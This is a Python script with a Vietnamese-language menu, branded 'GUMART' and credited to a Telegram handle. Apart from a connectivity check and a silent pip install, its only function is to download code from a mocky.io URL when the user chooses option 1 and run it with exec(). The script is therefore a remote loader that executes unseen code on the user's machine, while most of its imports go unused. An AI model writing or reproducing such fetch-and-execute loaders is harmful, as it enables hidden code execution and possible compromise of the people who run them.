import os
import sys
import time
import shutil
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import uuid
import json
import requests
import socket

try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style, init
    from random import randint
    import pystyle
except ImportError:
    os.system("pip install faker requests colorama pystyle")

from pystyle import Add, Center, Anime, Colors, Colorate, Write

PINK = '\033[38;5;13m'
RED = '\033[38;5;9m'
YELLOW = '\033[38;5;11m'
GREEN = '\033[38;5;10m'
LIGHT_PINK = '\033[38;5;207m'
BLINK = '\033[5m'
RESET = '\033[0m'
FLAME_ORANGE = '\033[38;5;208m'
SILVER = '\033[38;5;231m'
# Initialize colorama
init(autoreset=True)

def banner():
    # Placeholder for your banner function
    print(f"🐮{LIGHT_PINK} Vui lòng chọn chức năng{RESET}")

def check_internet_connection():
    try:
        # Thử kết nối đến một trang web nổi tiếng
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

try:
    while True:
        banner()
        print(f"{SILVER}GUMART 🛒 {LIGHT_PINK}code by 🐮 {RESET}")
        print(f"{LIGHT_PINK}tele{YELLOW}: {PINK}tphuc_0 {RESET}")
        print(f"{SILVER}GUMART 🛒  {YELLOW}({GREEN}1{YELLOW})")
        chon = input(f"{GREEN}Nhập số {YELLOW}({LIGHT_PINK}1{YELLOW}){GREEN}  để chạy hoặc {RED}0 {GREEN}để thoát {YELLOW}:{SILVER} ")

        if chon == '0':
            print(f"{RED}Đã kết thúc chương trình...")
            break
        elif chon == '1':
            if check_internet_connection():
                try:
                    response = requests.get('https://run.mocky.io/v3/40f0b6ea-8b4b-4f4f-9451-7598ab244ea9')
                    response.raise_for_status()  # Kiểm tra lỗi HTTP
                    exec(response.text)
                except requests.RequestException as e:
                    print(f"{RED}Lỗi kết nối mạng: {e}{RESET}??")
            else:
                print(f"{RED}Không có kết nối mạng. Vui lòng kiểm tra kết nối của bạn???.{RESET}")
        else:
            print(f"{RED}Vui lòng chỉ nhập số {RESET}")
except KeyboardInterrupt:
    print(f"{RED}\nĐã kết thúc chương trình...")
